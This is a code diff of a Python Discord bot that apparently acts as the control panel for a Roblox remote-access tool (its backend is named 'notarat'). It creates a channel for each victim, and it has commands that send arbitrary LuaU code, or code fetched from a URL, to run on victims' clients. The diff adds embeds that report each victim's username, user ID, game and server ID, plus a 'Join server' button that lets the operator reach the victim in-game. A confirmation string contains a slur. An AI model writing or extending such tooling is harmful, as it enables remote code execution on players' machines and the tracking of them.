@@ -1,9 +1,9 @@
 import discord
-from discord import TextChannel
-from discord import app_commands
+from discord import TextChannel, app_commands, ui, ButtonStyle
 import requests
 import os
 import asyncio
+import aiohttp
 
 class MyClient(discord.Client):
     def __init__(self):
@@ -40,7 +40,11 @@ class MyClient(discord.Client):
                     print("category not found.. creating channel outside category...")
                     channel = await guild.create_text_channel(uid)
 
-                await channel.send("online")
+                embed, view = await generate_info_embed(uid)
+                if embed:
+                    await channel.send(embed=embed, view=view)
+                else:
+                    await channel.send("online (no info)")
             except discord.HTTPException as e:
                 print(f"Error creating channel for {uid}: {e}")
             await asyncio.sleep(15)
@@ -66,8 +70,12 @@ class MyClient(discord.Client):
                         if not existing_channel:
                             if uid not in self.channel_creation_queue:
                                 self.channel_creation_queue.append(uid)
-                        elif existing_channel:
-                            await existing_channel.send("online")
+                        else:
+                            embed, view = await generate_info_embed(uid)
+                            if embed:
+                                await existing_channel.send(embed=embed, view=view)
+                            else:
+                                await existing_channel.send("online (no info)")
                     for uid in removed:
                         channel = discord.utils.get(guild.text_channels, name=uid)
                         if channel:
@@ -81,6 +89,35 @@ class MyClient(discord.Client):
             await asyncio.sleep(5)
 
 client = MyClient()
+
+async def generate_info_embed(uid: str):
+    async with aiohttp.ClientSession() as session:
+        async with session.get(f"https://notarat-798z.onrender.com/info_report/{uid}") as resp:
+            if resp.status != 200:
+                return None, None
+            info = await resp.json()
+
+    displayname = info.get("displayname", "Unknown")
+    username = info.get("username", "unknown_user")
+    gameid = info.get("placeid", "0")
+    jobid = info.get("jobid", "")
+    userid = info.get("userid", "N/A")
+
+    roblox_url = f"https://www.roblox.com/games/start?placeId={gameid}&gameId={jobid}"
+    profile_url = f"https://www.roblox.com/users/{userid}/profile"
+
+    embed = discord.Embed(title=f"{displayname} is Online", color=discord.Color.green())
+    embed.add_field(name="Username", value=f"@{username}", inline=False)
+    embed.add_field(name="UserID", value=userid)
+    embed.add_field(name="Game", value=info.get("game", "N/A"))
+    embed.add_field(name="PlaceID", value=gameid)
+    embed.add_field(name="JobID", value=jobid)
+
+    view = ui.View()
+    view.add_item(ui.Button(label="Join server", url=roblox_url, style=ButtonStyle.link))
+    view.add_item(ui.Button(label="View profile", url=profile_url, style=ButtonStyle.link))
+
+    return embed, view
 
 @client.tree.command(name="print", description="print smth")
 @app_commands.describe(arg="text 2 print")
@@ -109,7 +146,7 @@ async def print_command(interaction: discord.Interaction, arg: str):
         else:
             await interaction.response.send_message("failed to talk 2 server", ephemeral=True)
     except Exception as e:
-        await interaction.response.send_message(f"error {e}", ephemeral=True)
+        await interaction.response.send_message(f"error {e}", ephemeral=False)
 
 @client.tree.command(name="loadstring", description="print('hi')")
 @app_commands.describe(code="LuaU code")
@@ -138,7 +175,7 @@ async def loadstring_command(interaction: discord.Interaction, code: str):
         else:
             await interaction.response.send_message("failed to talk to server", ephemeral=True)
     except Exception as e:
-        await interaction.response.send_message(f"error {e}", ephemeral=True)
+        await interaction.response.send_message(f"error {e}", ephemeral=False)
 
 @client.tree.command(name="hloadstring", description="fetch code from a website")
 @app_commands.describe(url="website URL")
@@ -167,78 +204,31 @@ async def hloadstring_command(interaction: discord.Interaction, url: str):
         else:
             await interaction.response.send_message("failed to talk to server", ephemeral=True)
     except Exception as e:
-        await interaction.response.send_message(f"error {e}", ephemeral=True)
-
-from discord import ui, ButtonStyle, Colour
-
-
+        await interaction.response.send_message(f"error {e}", ephemeral=False)
 
 @client.tree.command(name="info", description="user info")
 async def info_command(interaction: discord.Interaction):
-    from discord import ui, ButtonStyle
-
     channel = interaction.channel
     if not isinstance(channel, TextChannel):
-        await interaction.response.send_message("WRONG CHANNEL", ephemeral=True)
+        await interaction.response.send_message("WRONG CHANNEL", ephemeral=False)
         return
 
     userid = channel.name
     if not userid.isdigit():
-        await interaction.response.send_message("WRONG CHANNEL", ephemeral=True)
+        await interaction.response.send_message("WRONG CHANNEL", ephemeral=False)
         return
 
     if userid not in client.active_users:
-        await interaction.response.send_message("offline", ephemeral=True)
+        await interaction.response.send_message("offline", ephemeral=False)
         return
 
     await interaction.response.defer(ephemeral=False)
 
-    import aiohttp
-    async with aiohttp.ClientSession() as session:
-        async with session.get(f"https://notarat-798z.onrender.com/info_report/{userid}") as resp:
-            if resp.status != 200:
-                await interaction.followup.send("no info twin", ephemeral=True)
-                return
-            info = await resp.json()
-
-    displayname = info.get("displayname", "Unknown")
-    username = info.get("username", "unknown_user")
-    gameid = info.get("placeid", "0")
-    jobid = info.get("jobid", "")
-    userid = info.get("userid", "N/A")
-
-
-    roblox_url = f"https://www.roblox.com/games/start?placeId={gameid}&gameId={jobid}"
-    profile_url = f"https://www.roblox.com/users/{userid}/profile"
-
-    embed = discord.Embed(title="Information")
-    embed.add_field(name="Username", value=f"@{username}", inline=False)
-    embed.add_field(name="UserID", value=userid)
-    embed.add_field(name="Game", value=info.get("game", "N/A"))
-    embed.add_field(name="PlaceID", value=gameid)
-    embed.add_field(name="JobID", value=jobid)
-
-    class RobloxButton(ui.View):
-        def __init__(self):
-            super().__init__()
-            self.add_item(
-                ui.Button(
-                    label="Join server",
-                    url=roblox_url,
-                    style=ButtonStyle.link
-                )
-            )
-            self.add_item(
-                ui.Button(
-                    label="View profile",
-                    url=profile_url,
-                    style=ButtonStyle.link
-                )
-            )
-
-    await interaction.followup.send(embed=embed, view=RobloxButton(), ephemeral=True)
-
-
+    embed, view = await generate_info_embed(userid)
+    if embed:
+        await interaction.followup.send(embed=embed, view=view, ephemeral=True)
+    else:
+        await interaction.followup.send("no info twin", ephemeral=False)
 
 @client.tree.command(name="cleardb", description="clears database")
 @app_commands.describe(confirm="type 'doitretard' to force clear")
@@ -270,12 +260,11 @@ async def clear_active_command(interaction: discord.Interaction, confirm: str = 
                 )
         except Exception as e:
             await interaction.followup.send(f"error: {e}", ephemeral=True)
-
     if confirm == "doitretard":
         await run_clear()
         return
 
-    if author_id not in client.clear_confirmations: # ok
+    if author_id not in client.clear_confirmations:
         client.clear_confirmations.add(author_id)
         await interaction.response.send_message(
             "run the cmd again within 30 seconds to confirm\n"
@@ -289,9 +278,5 @@ async def clear_active_command(interaction: discord.Interaction, confirm: str = 
     else:
         await run_clear()
         client.clear_confirmations.discard(author_id)
-
-
-
-
 
 client.run(os.getenv("TOKEN"))
